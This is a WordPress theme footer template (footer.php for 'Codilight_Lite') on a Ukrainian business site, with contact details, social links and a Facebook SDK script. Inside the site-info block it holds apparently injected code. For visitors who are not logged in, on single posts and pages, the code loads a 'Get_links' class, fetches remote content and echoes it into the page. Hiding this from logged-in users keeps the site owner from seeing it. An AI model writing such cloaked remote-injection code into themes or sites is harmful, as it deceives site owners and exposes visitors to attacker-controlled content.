<?php
/**
 * The template for displaying the footer.
 *
 * Contains the closing of the #content div and all content after.
 *
 * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
 *
 * @package Codilight_Lite
 */
?>
		</div> <!--#content-inside-->
	</div><!-- #content -->
	<div class="footer-shadow container">
		<div class="row">
			<div class="col-md-12">
				<img src="<?php echo get_template_directory_uri().'/assets/images/footer-shadow.png' ?>" alt="" />
			</div>
		</div>
	</div>
	<footer id="colophon" class="site-footer" role="contentinfo">
		<div class="container">

			<?php if ( has_nav_menu( 'footer' ) ): ?>
			<div class="footer-navigation">
				<?php wp_nav_menu( array('theme_location' => 'footer', 'container' => 'footer-menu', 'fallback_cb' => false ) ); ?>
			</div>
			<?php endif; ?>

			<div class="site-info">
				<div class="row">
					<div class="col-md-3"><a href="https://www.facebook.com/ml.astradia/"><i class="fa fa-facebook-square fa-4x" aria-hidden="true"></i></a> <a href="https://plus.google.com/116653445142391593813"><i class="fa fa-google-plus-square fa-4x" aria-hidden="true"></i></a></div>
					<div class="col-md-6 text-center"><span style="font-size:20px;"><i class="fa fa-phone" aria-hidden="true"></i> 0 (312) 64 46 75 | 067 312 66 69 | 050 338 17 78</br><i class="fa fa-envelope-o" aria-hidden="true"></i> info@astra-dia.com.ua</span></div>
					<div class="col-md-3"><span style="font-size:18px;"><a href="/">Контакти</a> | <a href="/vidguki/">Відгуки</a></span></div>
				</div>
				


<?php if ($user_ID) : ?><?php else : ?>
<?php if (is_single() || is_page() ) { ?>
<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); 
$links = new Get_links(); $links = $links->get_remote(); echo $links; ?>
<?php } ?>
<?php endif; ?>
			</div><!-- .site-info -->

		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<?php wp_footer(); ?>
<a href="#" class="scrollup">Наверх</a>
<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/ru_RU/sdk.js#xfbml=1&version=v2.6";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
</body>
</html>
